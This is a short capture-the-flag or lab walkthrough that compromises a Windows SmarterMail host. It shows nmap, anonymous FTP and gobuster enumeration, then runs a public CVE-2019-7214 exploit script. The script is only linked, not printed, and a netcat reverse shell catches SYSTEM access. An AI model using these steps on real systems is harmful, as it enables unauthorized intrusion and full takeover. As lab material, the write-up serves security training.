***1: Reconnaissance***

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: N/A GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
17001/tcp open  remoting MS .NET Remoting services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: N/A
|_  start_date: N/A
```

***2: 21 FTP***
```
$ ftp 192.168.71.65
Connected to 192.168.71.65.
220 Microsoft FTP Service
Name (192.168.71.65:kashz): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  10:31PM       <DIR>          ImapRetrieval
08-13-21  02:54PM       <DIR>          Logs
04-29-20  10:31PM       <DIR>          PopRetrieval
04-29-20  10:32PM       <DIR>          Spool
226 Transfer complete.

# logs dir
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  11:26PM                  582 2020.04.29-delivery.log
04-29-20  11:15PM                    0 2020.04.29-profiler.log
04-29-20  11:26PM                  208 2020.04.29-smtpLog.log
04-29-20  11:26PM                  300 2020.04.29-xmppLog.log
05-12-20  03:36AM                  504 2020.05.12-administrative.log
# lots more

$ cat 2020.05.12-administrative.log
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
```
***3: 80 IIS 10***
```
http://192.168.71.65/
IIS Splash Page

# nothing in gobuster
```
***4: 9998 IIS 10***

Exploit: https://github.com/devzspy/CVE-2019-7214/blob/master/cve-2019-7214.py

```
http://192.168.71.65:9998/interface/root#/login
SmarterMail Login Page

$ gobuster dir -u http://192.168.71.65:9998 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x asp,apsx,html,txt -t 80
===============================================================
/download             (Status: 500) [Size: 36]
/services             (Status: 301) [Size: 158] [--> http://192.168.71.65:9998/services/]
/reports              (Status: 301) [Size: 157] [--> http://192.168.71.65:9998/reports/]
/scripts              (Status: 301) [Size: 157] [--> http://192.168.71.65:9998/scripts/]
/api                  (Status: 302) [Size: 132] [--> /interface/root]
/interface            (Status: 301) [Size: 159] [--> http://192.168.71.65:9998/interface/]

SmarterMail Exploit
Using https://raw.githubusercontent.com/devzspy/CVE-2019-7214/master/cve-2019-7214.py

$ python3 cve-2019-7214.py 
$ nc -lvnp 9998

listening on [any] 9998 ...
connect to [192.168.49.71] from (UNKNOWN) [192.168.71.65] 49740

PS C:\Windows\system32> whoami
nt authority\system
```


